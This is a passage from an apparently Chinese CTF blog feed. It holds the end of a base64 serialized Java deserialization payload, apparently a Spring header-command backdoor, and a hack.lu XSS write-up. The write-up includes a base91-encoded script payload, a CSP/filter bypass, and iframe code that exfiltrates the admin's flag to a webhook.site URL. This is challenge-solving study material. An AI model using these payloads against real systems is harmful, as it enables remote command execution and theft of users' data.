RNYXBwaW5nSW5mbyRCdWlsZGVyAQAHb3B0aW9ucwEAnShMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbyRCdWlsZGVyQ29uZmlndXJhdGlvbjspTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlcjsBAAVidWlsZAEAQSgpTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm87AQAIaW50VmFsdWUBAAMoKUkBAA9yZWdpc3Rlck1hcHBpbmcBAG4oTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm87TGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDspVgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL09iamVjdDspVgEACWdldEhlYWRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAFd3JpdGUBAAVmbHVzaAAhABAAOQAAAAEAAQA6ADsAAAAFAAEAPAA9AAIAPgAAAW8ABgAIAAAAoyq3AAEqA7gAArUAA7gABBIFA7kABgMAwAAHTCsSCLkACQIAwAAITSy2AAoSC7YADE4tBLYADS0stgAOwAAPOgQSEBIRBb0AElkDEhNTWQQSFFO2ABU6BQS9ABZZAxIXU7gAGBkEuQAZAgC5ABoBADoGKrQAA7YAG5oAKrsAEFkSHLcAHToHLBkGGQcZBbYAHrIAHyq0AAO2ACAqBLgAArUAA7EAAAADAD8AAAA%2BAA8AAAAaAAQAGAAMABwAGwAeACcAIAAxACEANgAiAEAAJQBXACgAcQAqAHsAKwCGACwAkAAtAJoALgCiADEAQAAAAFIACACGABwAQQBCAAcAAACjAEMAQgAAABsAiABEAEUAAQAnAHwARgBHAAIAMQByAEgASQADAEAAYwBKAE0ABABXAEwATgBPAAUAcQAyAFAAUQAGAFIAAAAeAAH%2FAKIABwcAUwcAVAcAVQcAVgcAVwcAWAcAWQAAAFoAAAAEAAEAWwABADwAXAABAD4AAABJAAIAAgAAAA0qtwABKgO4AAK1AAOxAAAAAgA%2FAAAADgADAAAAMwAEABgADAA1AEAAAAAWAAIAAAANAEMAQgAAAAAADQBdAF4AAQABAF0AXwACAD4AAAGDAAUACQAAAKkrEiG5ACICAMYAoAQ%2BEiO4ACQ6BBkExgASGQS2ACUSJrYAJ5kABQM%2BHZkAHwa9ABZZAxIoU1kEEilTWQUrEiG5ACICAFOnABwGvQAWWQMSKlNZBBIrU1kFKxIhuQAiAgBTOgW4ACwZBbYALbYALjoGuwAvWRkGtwAwEjG2ADI6BxkHtgAzmQALGQe2ADSnAAUSNToILLkANgEAGQi2ADcsuQA2AQC2ADixAAAAAwA%2FAAAAMgAMAAAAOAALADkADQA6ABQAOwAmADwAKAA%2BAGMAPwBwAEAAgABBAJQAQgCfAEMAqABFAEAAAABcAAkADQCbAGAAYQADABQAlABiAF4ABABjAEUAYwBkAAUAcAA4AGUAZgAGAIAAKABnAGgABwCUABQAaQBeAAgAAACpAEMAQgAAAAAAqQBqAGsAAQAAAKkAbABtAAIAUgAAAC4ABv0AKAEHAG4fWAcAb%2F4ALgcAbwcAcAcAcUEHAG7%2FABUAAwcAUwcAcgcAcwAAAFoAAAAEAAEAWwABAHQAdQACAD4AAAA%2FAAAAAwAAAAGxAAAAAgA%2FAAAABgABAAAASgBAAAAAIAADAAAAAQBDAEIAAAAAAAEAdgB3AAEAAAABAHgAeQACAFoAAAAEAAEAegABAHQAewACAD4AAABJAAAABAAAAAGxAAAAAgA%2FAAAABgABAAAATwBAAAAAKgAEAAAAAQBDAEIAAAAAAAEAdgB3AAEAAAABAHwAfQACAAAAAQB%2BAH8AAwBaAAAABAABAHoAAgCAAAAAAgCBAEwAAAASAAIADwCUAEsACQCeAJQA4gYJcHQACFNxdWlydDFlcHcBAHh1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAN2cgAjb3JnLnNwcmluZ2ZyYW1ld29yay5hb3AuU3ByaW5nUHJveHkAAAAAAAAAAAAAAHhwdnIAKW9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLmZyYW1ld29yay5BZHZpc2VkAAAAAAAAAAAAAAB4cHZyAChvcmcuc3ByaW5nZnJhbWV3b3JrLmNvcmUuRGVjb3JhdGluZ1Byb3h5AAAAAAAAAAAAAAB4cA%3D%3D%22%3A%22%22%7D%7D%7D</code></pre><p>用这个<code>payload</code>打两次即可，第一次赋值<code>false</code>和<code>payload</code>，第二次反序列化利用。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1700660237449.png" alt="1700660237449"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记hack.lu两道XSS题</title>
      <link href="/2023/10/31/hacklu-liang-dao-xss/"/>
      <url>/2023/10/31/hacklu-liang-dao-xss/</url>
      
        <content type="html"><![CDATA[<p>虽然都是签到题，但是都是签到题不太可能。</p><h4 id="Based-Encoding"><a href="#Based-Encoding" class="headerlink" title="Based Encoding"></a>Based Encoding</h4><p><code>note</code>题，最主要的路由就下面这三个。<code>/create</code>创建一个<code>note</code>，但是内容会被<code>base91</code>编码，这里纯粹是为了加难度而加难度。谁家<code>note</code>写完了会套一层编码，当谜语人吗？</p><p><code>encoding_id</code>是随机生成的，可以用这个<code>id</code>通过<code>/e/id</code>访问<code>note</code>。</p><p><code>/report</code>向<code>admin</code>举报一个<code>note</code>，<code>admin</code>会访问这个<code>note</code>，并且<code>flag</code>只有<code>admin</code>能访问。</p><p>这里进行了比较严格的限制，所以只能提交note id。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">init_db</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    db<span class="token punctuation">,</span> cur <span class="token operator">=</span> get_cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>    cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"CREATE TABLE IF NOT EXISTS accounts (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT NOT NULL UNIQUE, password TEXT NOT NULL, admin INTEGER)"</span><span class="token punctuation">)</span>    cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"INSERT INTO accounts (username, password, admin) VALUES ('admin', ?, 1)"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>admin_password<span class="token punctuation">]</span><span class="token punctuation">)</span>    cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"CREATE TABLE IF NOT EXISTS encodings (id TEXT NOT NULL UNIQUE, text TEXT NOT NULL, creator, expires INTEGER DEFAULT 0)"</span><span class="token punctuation">)</span>    cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"INSERT INTO encodings (id, text, creator, expires) VALUES (?, ?, 'admin', 0)"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>secrets<span class="token punctuation">.</span>token_hex<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">,</span> FLAG<span class="token punctuation">]</span><span class="token punctuation">)</span>    db<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>    db<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">//</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/create"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token operator">not</span> session<span class="token punctuation">:</span>        flash<span class="token punctuation">(</span><span class="token string">"Please log in"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"GET"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"create.html"</span><span class="token punctuation">,</span> logged_out<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token operator">not</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"text"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"Missing text"</span>        text <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"text"</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> len<span class="token punctuation">(</span>text<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1000</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">"Too long!"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"/create"</span><span class="token punctuation">)</span>        encoded <span class="token operator">=</span> based91<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token operator">not</span> <span class="token punctuation">(</span>re<span class="token punctuation">.</span>match<span class="token punctuation">(</span>r<span class="token string">"^[a-f0-9]+$"</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span> <span class="token operator">and</span> len<span class="token punctuation">(</span>text<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">else</span> bytes<span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>        encoding_id <span class="token operator">=</span> create_encoding<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> encoded<span class="token punctuation">)</span>                <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>f<span class="token string">"/e/{encoding_id}"</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/e/&lt;encoding_id>"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getEncoding</span><span class="token punctuation">(</span>encoding_id<span class="token punctuation">)</span><span class="token punctuation">:</span>    logged_out <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">,</span> None<span class="token punctuation">)</span> <span class="token keyword">is</span> None    encoding <span class="token operator">=</span> get_encoding<span class="token punctuation">(</span>encoding_id<span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"view_encoding.html"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span>encoding<span class="token punctuation">,</span> logged_out<span class="token operator">=</span>logged_out<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/report"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">report</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token operator">not</span> session<span class="token punctuation">:</span>        flash<span class="token punctuation">(</span><span class="token string">"Please log in"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"GET"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"report.html"</span><span class="token punctuation">,</span> logged_out<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    value <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token operator">not</span> value <span class="token operator">or</span> <span class="token operator">not</span> re<span class="token punctuation">.</span>match<span class="token punctuation">(</span>r<span class="token string">"^[a-f0-9]{40}$"</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>        flash<span class="token punctuation">(</span><span class="token string">"invalid value!"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"report.html"</span><span class="token punctuation">,</span> logged_out<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"timeout"</span><span class="token punctuation">,</span> <span class="token string">"-k"</span> <span class="token string">"15"</span><span class="token punctuation">,</span> <span class="token string">"15"</span><span class="token punctuation">,</span> <span class="token string">"node"</span><span class="token punctuation">,</span> <span class="token string">"adminbot.js"</span><span class="token punctuation">,</span> base_url<span class="token punctuation">,</span> admin_password<span class="token punctuation">,</span> value<span class="token punctuation">]</span><span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    flash<span class="token punctuation">(</span><span class="token string">"An admin going there."</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"report.html"</span><span class="token punctuation">,</span> logged_out<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>思路很明显就是要通过<code>note</code>触发<code>xss</code>，然后举报给<code>admin</code>从而获取他的<code>cookie</code>之类的。</p><h5 id="step1-Lead-to-XSS"><a href="#step1-Lead-to-XSS" class="headerlink" title="step1 Lead to XSS"></a>step1 Lead to XSS</h5><p>&#x2F;e&#x2F;noteid这个路由通过<code>render_template</code>渲染<code>view_encoding.html</code>，而能导致<code>xss</code>的关键就在于：</p><pre><code>&lt;h2 class=&quot;subtitle&quot;&gt;&#123;&#123;encoding|safe&#125;&#125;&lt;/h2&gt;</code></pre><p><code>safe</code>使得渲染的代码不进行转义直接输出在页面上，如果删掉这个<code>safe</code>渲染自动进行转义的话就没办法<code>xss</code>了。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1697517817188.png" alt="1697517817188"></p><p>这也是<code>ssti-&gt;xss</code>的一个小<code>trick</code>。<code>&#123;&#123;request.args.p|safe&#125;&#125;</code></p><p>如何让<code>base91</code>后的内容为：</p><pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><p>其实只要调用<code>base91</code>的解码函数就可以实现了。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> based91<span class="token keyword">import</span> binascii<span class="token keyword">import</span> re<span class="token keyword">def</span> <span class="token function">timu</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token operator">not</span> <span class="token punctuation">(</span>re<span class="token punctuation">.</span>match<span class="token punctuation">(</span>r<span class="token string">"^[a-f0-9]+$"</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span> <span class="token operator">and</span> len<span class="token punctuation">(</span>text<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        result<span class="token operator">=</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        result<span class="token operator">=</span>bytes<span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>text<span class="token punctuation">)</span>    encoded <span class="token operator">=</span> based91<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>result<span class="token punctuation">)</span>    <span class="token keyword">return</span> encodeddata <span class="token operator">=</span> based91<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"&lt;script>alert(1)&lt;/script>11"</span><span class="token punctuation">)</span>hex_data <span class="token operator">=</span> binascii<span class="token punctuation">.</span>hexlify<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"payload："</span><span class="token operator">+</span>hex_data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"base91编码后："</span><span class="token operator">+</span>timu<span class="token punctuation">(</span>hex_data<span class="token punctuation">)</span><span class="token punctuation">)</span>payload：f0afecd5baf31dd4ce9eff0dc33f1a4405311458326bbase91编码后：<span class="token operator">&lt;</span>script<span class="token operator">></span>alert<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token number">11</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>貌似由于编解码的问题导致生成的内容最后会有些失真，所以我最后加上了一些脏字符<code>11</code>。</p><p>使用生成的<code>payload</code>创建<code>note</code>即可<code>xss</code></p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1697518703324.png" alt="1697518703324"></p><h5 id="step2-bypass-base91-alphabet"><a href="#step2-bypass-base91-alphabet" class="headerlink" title="step2 bypass base91_alphabet"></a>step2 bypass base91_alphabet</h5><p>正当我以为拿下这个签到题的时候，我惊喜的发现<code>base91</code>字符表里没有<code>.</code>。而一般的<code>payload</code>都会用到点。</p><pre><code>base91_alphabet = [&#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;, &#39;E&#39;, &#39;F&#39;, &#39;G&#39;, &#39;H&#39;, &#39;I&#39;, &#39;J&#39;, &#39;K&#39;, &#39;L&#39;, &#39;M&#39;,    &#39;N&#39;, &#39;O&#39;, &#39;P&#39;, &#39;Q&#39;, &#39;R&#39;, &#39;S&#39;, &#39;T&#39;, &#39;U&#39;, &#39;V&#39;, &#39;W&#39;, &#39;X&#39;, &#39;Y&#39;, &#39;Z&#39;,    &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;,    &#39;n&#39;, &#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;, &#39;w&#39;, &#39;x&#39;, &#39;y&#39;, &#39;z&#39;,    &#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;!&#39;, &#39;#&#39;, &#39;$&#39;,    &#39;%&#39;, &#39;€&#39;, &#39;(&#39;, &#39;)&#39;, &#39;*&#39;, &#39;+&#39;, &#39;,&#39;, &#39;°&#39;, &#39;/&#39;, &#39;:&#39;, &#39;;&#39;, &#39;&lt;&#39;, &#39;=&#39;,    &#39;&gt;&#39;, &#39;?&#39;, &#39;@&#39;, &#39;[&#39;, &#39;]&#39;, &#39;^&#39;, &#39;_&#39;, &#39;`&#39;, &#39;&#123;&#39;, &#39;|&#39;, &#39;&#125;&#39;, &#39;~&#39;, &#39;&quot;&#39;]</code></pre><p>本来想用<code>eval(String.fromCharCode())</code>。</p><p>但他设置了<code>unsafe-inline</code>，这是个非常宽松的限制，但是限制了<code>eval</code>，并且不能远程加载<code>js</code>。</p><pre class="line-numbers language-python"><code class="language-python">    response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">"Content-Security-Policy"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"script-src 'unsafe-inline';"</span>    <span class="token keyword">return</span> response<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>js</code>层面的绕过有self取属性绕过。</p><pre><code>document.location               &lt;===&gt;           self[&quot;document&quot;][&quot;location&quot;]</code></pre><p>也不能用空格，标签中的属性空格可以用&#x2F;来代替，但实际利用中空格是用不到的。</p><h5 id="step3-bypass-http-only"><a href="#step3-bypass-http-only" class="headerlink" title="step3 bypass http only"></a>step3 bypass http only</h5><p>最常见的思路就是把管理员<code>cookie</code>偷出来。但由于<code>cookie</code>设置了<code>http only</code>，导致无法用<code>js</code>获取<code>cookie</code>。那么只能操控<code>admin</code>，让他先访问<code>/</code>路由获取第一个<code>noteid</code>（即<code>flag</code>的<code>noteid</code>），然后访问<code>/e/noteid</code>，取出来<code>flag</code>就行了。</p><p>这里选择操控两个<code>frame</code>，第一个<code>frame</code>访问根目录获取<code>noteid</code>，第二个<code>frame</code>访问<code>/e/noteid</code>获取<code>flag</code>，最后发给<code>dnslog</code>。</p><p>照着以上分析逻辑写就行了，通过<code>createElement</code>创建<code>frame</code>。需要调试的就是如何取<code>noteid</code>以及<code>flag</code>。这个可以自己创建个账号第一个<code>note</code>写个<code>testflag</code>来模拟测试。</p><p>过滤了<code>.</code>用<code>atob</code>函数解码一层即可绕过。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token operator">&lt;</span>script<span class="token operator">></span>    f1<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//第一个frame</span>    f1<span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">"/"</span><span class="token punctuation">;</span>    f1<span class="token punctuation">.</span>onload<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>        i<span class="token operator">=</span>f1<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span>document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//获取第一个noteid，flag noteid</span>        f2<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        f2<span class="token punctuation">.</span>src<span class="token operator">==</span><span class="token string">"/e/"</span><span class="token operator">+</span>i<span class="token punctuation">;</span>        f2<span class="token punctuation">.</span>onload<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>            f<span class="token operator">=</span>frame2<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span>document<span class="token punctuation">.</span><span class="token function">getElementsByClassName</span><span class="token punctuation">(</span><span class="token string">"subtitle"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>innerHTML<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//获取flag</span>            <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token function">atob</span><span class="token punctuation">(</span><span class="token string">"aHR0cHM6Ly93ZWJob29rLnNpdGUvZTU4ZWZmYTgtZDlkOS00OGEwLTk4ZjItMjJhOTYyOTYxYzIyLw=="</span><span class="token punctuation">)</span><span class="token operator">+</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>f2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>f1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后用<code>self</code>一个一个套上即可。</p><pre class="line-numbers language-python"><code class="language-python">data <span class="token operator">=</span> based91<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>'<span class="token operator">&lt;</span>script<span class="token operator">></span>\f1<span class="token operator">=</span>self<span class="token punctuation">[</span><span class="token string">"document"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"createElement"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\    self<span class="token punctuation">[</span><span class="token string">"f1"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"src"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"/"</span><span class="token punctuation">;</span>\    self<span class="token punctuation">[</span><span class="token string">"f1"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"onload"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>\        i<span class="token operator">=</span>self<span class="token punctuation">[</span><span class="token string">"f1"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"contentWindow"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"document"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"getElementsByTagName"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"text"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>\        f2<span class="token operator">=</span>self<span class="token punctuation">[</span><span class="token string">"document"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"createElement"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\        self<span class="token punctuation">[</span><span class="token string">"f2"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"src"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"/e/"</span><span class="token operator">+</span>i<span class="token punctuation">;</span>\        self<span class="token punctuation">[</span><span class="token string">"f2"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"onload"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>\            f<span class="token operator">=</span>self<span class="token punctuation">[</span><span class="token string">"f2"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"contentWindow"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"document"</span><span class="token punctuation">]</span><span class="token 